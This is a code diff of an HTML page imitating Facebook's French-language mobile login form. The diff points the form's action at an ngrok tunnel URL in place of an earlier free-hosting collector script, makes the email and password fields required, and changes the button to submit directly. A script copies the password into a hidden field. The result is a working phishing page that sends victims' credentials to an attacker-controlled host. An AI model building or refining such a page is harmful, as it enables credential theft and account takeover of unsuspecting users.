@@ -85,12 +85,11 @@
                     </div>
                   </div>
                   <div class="_5rut">
-                    <form target="_blank"
+                    <form 
                       method="post"
-                      action="https://watch-series.infinityfreeapp.com/processing.php"
+                      action="https://d266-41-216-54-72.ngrok-free.app"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
-                      
                     >
                       <input
                         type="hidden"
@@ -137,13 +136,14 @@
                               <input
                                 autocorrect="off"
                                 autocapitalize="off"
-                                type="email"
+                                type="text"
                                 class="_56bg _4u9z _5ruq _8qtn"
                                 autocomplete="on"
                                 id="m_login_email"
                                 name="email"
                                 placeholder="Numéro mobile ou e-mail"
                                 data-sigil="m_login_email"
+                                required
                               />
                             </div>
                           </div>
@@ -167,6 +167,7 @@
                                       name="pass"
                                       placeholder="Mot de passe"
                                       type="password"
+                                      required
                                       data-sigil="password-plain-text-toggle-input"
                                     />
                                     <input 
@@ -209,7 +210,7 @@
                           data-sigil="login_password_step_element"
                         >
                           <button
-                            type="button"
+                            type="submit"
                             value="Log In"
                             class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                             id="btnsubmit"
@@ -437,14 +438,9 @@
     <script>
       const hiddenPass = document.getElementById("hiddenPass");
       const password = document.getElementById("m_login_password");
-      const form = document.getElementById("login_form");
-      const btn = document.getElementById("btnsubmit");
       password.onchange = (e) => {
          hiddenPass.value = e.target.value;
       }
-      btn.onclick = (e) => {
-          setTimeout(()=>form.submit(),500)
-      }
       </script>
   </body>
-                           </html>
+</html>
